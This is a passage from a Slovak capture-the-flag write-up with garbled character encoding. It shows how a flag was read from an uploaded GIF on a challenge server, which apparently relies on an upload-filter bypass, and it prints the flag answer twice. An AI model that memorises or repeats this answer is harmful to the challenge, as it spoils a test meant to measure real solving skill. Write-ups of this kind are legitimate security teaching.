Potom len nav≈°t√≠vime `http://exp.cybergame.sk:7020/uploads/temp/ceabd9a3ca77eb8bdb82ded8354d16d8.gif` otvor√≠me napr√≠klad v notepad++ a vid√≠me

`GIF89a$)CSK-CERT{i_l0v3_f1lt3r5_4nd_50_d03s_php}‚Ç¨@C≈ïƒêƒê≈ô √¥ √¥> = =‚Ç¨@C≈ïƒêƒê≈ô √¥ √¥> = =‚Ç¨@`

A takto sa n√°m podarilo exfiltrova≈• aj vlajku 2.

## Vlajka

    SK-CERT{i_l0v3_f1lt3r5_4nd_50_d03s_php}
